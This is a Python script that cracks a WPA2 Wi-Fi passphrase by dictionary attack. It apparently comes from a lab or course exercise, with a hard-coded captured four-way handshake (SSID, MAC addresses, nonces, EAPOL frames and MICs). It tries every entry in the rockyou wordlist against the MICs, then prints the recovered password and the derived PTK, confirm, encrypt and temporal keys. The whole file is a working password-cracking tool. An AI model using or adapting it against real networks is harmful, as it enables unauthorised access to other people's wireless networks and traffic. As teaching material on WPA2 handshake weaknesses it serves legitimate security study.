from pbkdf2 import PBKDF2
import hmac, binascii, hmac, hashlib, codecs



# Global Vars

# psk = "12345678"
ssid = "GL-MT300N-V2-88c"
mac_ap = binascii.unhexlify("9483c40c488c")
mac_cl = binascii.unhexlify("f84d899204ac")
anonce = binascii.unhexlify("d602c577a71f17e5718456df6d089ccce399f6a3ca571c4a2dd2ed9ee1b3fd5e")
snonce = binascii.unhexlify("9d5efa3ee4ac97d0ecac05f99e84c6ae124d6637c8358b231decb50ba0188bff")
auth_pack_list = [binascii.unhexlify("0103007502010a001000000000000000019d5efa3ee4ac97d0ecac05f99e84c6ae124d6637c8358b231decb50ba0188bff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020c00"),
binascii.unhexlify("010300970213ca00100000000000000002d602c577a71f17e5718456df6d089ccce399f6a3ca571c4a2dd2ed9ee1b3fd5e0000000000000000000000000000000003010000000000000000000000000000000000000000000000000000000000000038b71430334ddfa9b01ff8f1228401ddd6c6d4fffd75e7e65a0da907e9d7b2237580a7ba586bda5221b5ed89a79601b021fd16c7e6d409c1ee"),
binascii.unhexlify("0103005f02030a0010000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")]
mic_list = ["d0bbc76e4686d269895dd49253034818", "73c53df9b33ad9788971fe1904b6a0da", "02b126f4fa70329da88145815e249613"]
pke = b"Pairwise key expansion"
key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce,snonce) + max(anonce,snonce)


def customPRF384(key, A, B):
    # Using 48 since it is CCMP protocol
    blen = 48
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]

def compute_mic(psk, auth_pack):
    pmk = hashlib.pbkdf2_hmac('sha1', psk.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    ptk = customPRF384(pmk, pke, key_data)
    computed_mic = hmac.new(ptk[:16], auth_pack, hashlib.sha1).hexdigest()[:32]
    return computed_mic
    

def validation_test(psk):
    for i in range(0,3):
        result = compute_mic(psk, auth_pack_list[i])
        if(not result == mic_list[i]):
            return False
    return True

def validation_test_2(psk):
    for i in range(0,3):
        result = compute_mic(psk, auth_pack_list[i])
        print("Actual mic:\t" + mic_list[i])
        print("Computed mic:\t" + result)
        if(result == mic_list[i]):
            print("Matched !\n")
        else: 
            print("Unmatched !\n")
            return False
    return True


def dictionary_attack(file_path):
    with codecs.open('/usr/share/wordlists/rockyou.txt', 'r', encoding='utf-8',
                 errors='replace') as f:
        for psk in f:
            psk = psk.strip()
            if(validation_test(psk)):
                validation_test_2(psk)
                print(f"Password Found: {psk}\n")
                return psk
    return None


if __name__ == "__main__":

    # Cracking password
    psk = dictionary_attack('/usr/share/wordlists/rockyou.txt')
    if (psk != None):
        pmk = hashlib.pbkdf2_hmac('sha1', psk.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        ptk = customPRF384(pmk, pke, key_data)
        print (f"PTK Original:                {ptk.hex()}")
        print (f"EAPOL-Key Confirm Key:       {ptk[:16].hex()}")
        print (f"EAPOL-Key Encrypt Key:       {ptk[16:32].hex()}")
        print (f"CCMP Temporal Key:    {ptk[32:].hex()}")
    else:
        print(f"Password Not Found !")